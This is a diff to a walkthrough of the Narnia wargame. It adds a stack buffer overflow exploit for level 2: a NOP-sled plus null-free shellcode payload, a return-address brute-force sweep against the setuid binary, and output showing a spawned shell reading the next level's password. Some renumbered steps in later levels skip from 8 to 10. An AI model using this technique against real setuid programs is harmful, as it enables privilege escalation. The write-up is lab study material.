@@ -58,7 +58,7 @@ Verification: each password was accepted by logging in as the next level's accou
    # $1 = 0xffffd328   (buffer)      $2 = 0xffffd3ac   (return address)
    ```
    The 4-byte gap between buffer and return address (128 bytes) matches the disassembly.
-5. **Write the shellcode in `vim /tmp/l2.asm`.** It is null-free (argv cannot contain NUL bytes) and does three things:
+5. **Open `vim /tmp/l2.asm` in the recorded session** (`vim -u NONE -N /tmp/l2.asm`, `i` to enter insert mode) and type the shellcode by hand. It is null-free (argv cannot contain NUL bytes) and does three things:
    ```
    BITS 32
    global _start
@@ -113,13 +113,23 @@ Verification: each password was accepted by logging in as the next level's accou
    wc -c /tmp/l2.bin      # 64
    ```
    The exploit reads this file instead of re-typing bytes, so the payload provably comes from the assembler.
-8. **Build the payload and run the exploit.**
+8. **Write the exploit in `vim /tmp/e_narnia2.py`** — again typed live, not copied from anywhere. It loads the shellcode *from the assembler output* (`open("/tmp/l2.bin","rb").read()`), asserts it contains no NUL and fits in 128 bytes, and defines the layout:
+   ```
+   def payload_for(addr):
+       p = b"\x90" * (128 - len(sc)) + sc      # 64 NOPs, then the shellcode
+       return p + b"B" * 4 + struct.pack("<I", addr)
+   ```
+   `probe(addr)` forks, dup2s a pipe onto stdout/stderr, `execve`s `/narnia/narnia2` with `argv[1] = payload_for(addr)`, and returns whether `PWN!` came out. The sweep loops `for addr in range(0xffffd000, 0xffffe800, 4)` and stops on the first hit; then `os.execve` re-runs the binary attached to the terminal so the spawned shell is interactive.
+9. **Run it.**
    ```
    python3 /tmp/e_narnia2.py
+   # shellcode (64 bytes): 31c0506850574e21...b00bcd80
+   # sweeping return addresses for the buf[128] strcpy overflow ...
+   # landed in the NOP sled at 0xffffd1f8
+   # PWN!$ id -> uid=14003(narnia3)
    ```
-   The Python exploit (`L2.py`) builds `payload = b"\x90"*(128-len(sc)) + sc + b"B"*4 + pack("<I", addr)` (128-byte NOP sled + shellcode filling `buf`, 4 bytes of saved EBP, 4-byte return address), forks a child per candidate address in `0xffffd000..0xffffe800`, redirects its stdout/stderr to a pipe, and looks for `PWN!`. On a hit it re-execs attached to the terminal so the shell can be driven.
    The sweep landed at **0xffffd1f8**. That address is inside the `argv[1]` copy on the stack, not inside `buf` — which is why the shellcode is placed at the *end* of the 128-byte block: its own `push` instructions write into `buf` (and below), so they never touch the copy above `argv` where the code runs.
-9. **Use the shell.**
+10. **Use the shell.**
    ```
    id                        # uid=14003(narnia3) gid=14002(narnia2)
    cat /etc/narnia_pass/narnia3
@@ -279,7 +289,7 @@ Verification: each password was accepted by logging in as the next level's accou
    Change i's value from 1 -> 500. GOOD
    ```
    and the program drops into a shell.
-9. **Use the shell.**
+10. **Use the shell.**
    ```
    id                        # uid=14006(narnia6) gid=14005(narnia5)
    cat /etc/narnia_pass/narnia6
@@ -411,7 +421,7 @@ Verification: each password was accepted by logging in as the next level's accou
    ```
    `argv[20..23]` keeps `blah` valid; `argv[28..31]` is the return address into the NOP sled at `argv+32`.
 8. **Run it.** `python3 /tmp/e_narnia8.py` prints the buffer, then `PWN!`, and drops into a shell.
-9. **Use the shell.**
+10. **Use the shell.**
    ```
    id                        # uid=14009(narnia9) gid=14008(narnia8)
    cat /etc/narnia_pass/narnia9
